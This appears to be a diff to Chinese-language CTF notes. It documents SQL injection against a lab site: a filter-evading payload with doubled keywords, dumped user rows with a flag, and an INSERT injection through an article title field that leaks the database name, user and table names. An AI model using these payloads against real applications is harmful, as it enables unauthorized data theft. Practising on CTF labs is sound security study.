@@ -1047,3 +1047,21 @@ admin'%20anandd%20subsubstrstr((selselectect%20group_concat(id%2c%22%3a%22%2cuse
 | 0   | admin    | admin666666                                 |
 | 1   | hazel    | hazel{d3f3bac6-3fe8-4e5e-8680-40a5b0003799} |
 
+[嘤嘤嘤]insertsql #SQL注入漏洞 
+insert注入，查看页面，有上传文章的功能
+![[Pasted image 20240329124443.png]]
+尝试在标题注入，其显示上传失败，并快速重定向至主页面，但是显示了一瞬间的sql语句，打开BP的intercept,显示出了其使用的sql语句：
+```
+insert into article(title,author,description,content,dateline) values('114514' and 1=2#','114514','114514','114514',1711687035)
+```
+可以看到除了标题还有4个字段，那就在标题构造注入：
+```
+114514',database(),user(),'114514',1919810)#
+```
+去管理文章的页面点击修改我们刚发布的文章，可以看到其回显了数据库名以及用户名：
+![[Pasted image 20240329124936.png]]
+接下来爆表名 为article,hazel
+```
+10086',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'10086','10086','1919810')#
+```
+![[Pasted image 20240329125252.png]]
